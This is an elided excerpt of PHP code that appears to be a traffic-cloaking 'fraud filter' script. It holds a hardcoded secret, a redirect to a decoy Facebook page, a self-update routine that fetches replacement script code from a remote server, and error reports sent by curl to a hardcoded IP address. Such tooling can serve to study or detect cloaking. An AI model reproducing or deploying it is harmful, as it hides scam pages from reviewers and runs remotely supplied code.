...
class FraudFilterDetector_5n402 {
    ...
    function isSignatureValid($sign, $time) {
        $str = '7eb69511-f999-4f65-99b8-16c831474265.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.facebook.com/physics.tuition.96');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 7eb69511-f999-4f65-99b8-16c831474265',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 7eb69511-f999-4f65-99b8-16c831474265';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 7eb69511-f999-4f65-99b8-16c831474265';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=5n402&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_5n402 = new FraudFilterDetector_5n402();
$fraudFilterDetector_5n402->check();
